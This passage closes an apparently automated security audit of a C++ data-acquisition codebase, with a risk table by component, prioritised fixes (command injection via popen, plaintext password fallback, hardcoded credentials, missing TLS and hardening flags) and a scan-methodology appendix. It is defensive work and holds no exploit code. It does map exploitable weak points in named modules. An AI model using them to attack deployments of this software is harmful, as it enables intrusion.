4. **No binary hardening**: The build system does not enforce any standard binary hardening measures.

5. **Inconsistent authentication enforcement**: Anonymous access can be enabled trivially, and the plaintext password fallback undermines the bcrypt hashing.

### Risk Summary by Component

| Component | Risk Level | Key Concerns |
|---|---|---|
| Native Streaming Protocol | **CRITICAL** | Cleartext auth, no TLS |
| Authentication Provider | **CRITICAL** | Plaintext fallback, no rate limiting |
| Simulator App | **CRITICAL** | Hardcoded creds, command injection |
| Ref Device Module | **CRITICAL** | OS command injection via popen |
| JSON Deserializer | **HIGH** | strcpy usage on network data |
| Module Manager | **HIGH** | Env var path injection |
| Config Protocol | **MEDIUM** | Integer truncation, OOB read |
| mDNS Discovery | **MEDIUM** | No authentication |
| Build System (CMake) | **HIGH** | No hardening flags |
| Core Object System | **LOW** | Conditional thread safety |

---

## Recommendations (Priority Order)

### Immediate (Sprint 1)

1. **Fix command injection** (SEC-001): Replace all `popen()`/`system()` calls with argument-array-based process spawning.
2. **Remove plaintext password fallback** (SEC-002): Make bcrypt the only accepted hash format.
3. **Externalize credentials** (SEC-003): Move hardcoded credentials to configuration files.
4. **Add binary hardening flags** (SEC-009): Enable stack canaries, FORTIFY_SOURCE, PIE, and RELRO.

### Short-term (Sprint 2-3)

5. **Implement TLS for native streaming** (SEC-004): Add TLS support for all network communications.
6. **Add authentication rate limiting** (SEC-005): Implement brute force protection.
7. **Replace strcpy with bounded alternatives** (SEC-006, SEC-008): Audit and fix all unsafe string operations.
8. **Add protocol payload bounds validation** (SEC-011, SEC-019): Validate all integer truncations and array accesses.

### Medium-term (Quarter)

9. **Implement SBOM and dependency scanning** (SEC-027)
10. **Add JSON schema validation** (SEC-017)
11. **Unify error messages for authentication** (SEC-015)
12. **Implement device identity verification for mDNS** (SEC-021)
13. **Make thread safety non-optional** (SEC-012)

---

## Appendix: Scan Methodology

This analysis was performed through static source code analysis of ~2,192 C++/H files using:

1. **Pattern-based SAST**: Regex scanning for unsafe function calls (`strcpy`, `sprintf`, `system`, `popen`), hardcoded credentials, cryptographic weaknesses, and concurrency primitives.
2. **Manual code review**: Deep analysis of authentication flows, network protocol handlers, serialization/deserialization paths, and build system configuration.
3. **Architecture review**: Assessment of the overall security posture including transport security, authentication mechanisms, access control, and defense-in-depth measures.

### Files Excluded from Analysis
- `/workspaces/cf-devpod/tmp/opendaq/external/` -- Third-party vendored code (miniaudio, rapidjson, boost, etc.) was noted but not deeply audited as it is not project-owned code. Findings in external code are noted where they affect the project's security posture.

### Scan Limitations
- No dynamic analysis (DAST) was performed -- the project was not compiled or executed.
- No fuzzing was performed on protocol handlers.
- OPC UA modules were not present in the source tree (built externally via `OPCUA_MODULES_SOURCE_DIR`), so OPC UA security configuration was not assessed.

---

*Report generated by QE Security Scanner v3 -- 2026-03-30*
*Scan duration: comprehensive manual + automated analysis*
*Classification: INTERNAL -- SECURITY SENSITIVE*
